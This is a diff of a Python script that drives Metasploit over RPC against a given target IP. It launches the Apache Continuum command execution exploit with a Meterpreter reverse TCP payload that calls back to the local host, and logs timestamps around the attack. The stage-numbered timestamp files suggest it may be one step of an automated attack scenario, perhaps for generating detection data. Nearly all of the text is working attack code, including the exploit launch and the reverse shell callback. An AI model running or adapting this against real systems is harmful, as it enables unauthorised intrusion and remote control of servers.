@@ -11,31 +11,30 @@ def record_timestamp(folder, output_time_file):
 
 
 def main(argv):
-    if len(argv) != 4:
-        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
-
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
     
-    output_time_file_start = 'time_step_4_start.txt'
+    output_time_file_start = 'time_step_3_start.txt'
     record_timestamp(folder, output_time_file_start)
-    time.sleep(2)
+    time.sleep(60)
 
     client = MsfRpcClient('kali')
+    
+    try:
+        exploit = client.modules.use('exploit', 'linux/http/apache_continuum_cmd_exec')
+        payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
+        exploit['RHOSTS'] = target_ip
+        payload['LHOST'] = my_ip
 
-    exploit = client.modules.use('exploit', 'linux/http/apache_continuum_cmd_exec')
-    payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
-    exploit['RHOSTS'] = target_ip
-    payload['LHOST'] = my_ip
+        exploit.execute(payload=payload)
+    
+    except Exception as e:
+        print(e)
+        pass
 
-    exploit.execute(payload=payload)
-
-    while client.jobs.list:
-        time.sleep(1)
-
-    time.sleep(30)
-    output_time_file_end = 'time_step_4_end.txt'
+    time.sleep(60)
+    output_time_file_end = 'time_step_3_end.txt'
     record_timestamp(folder, output_time_file_end)
     time.sleep(30)
 
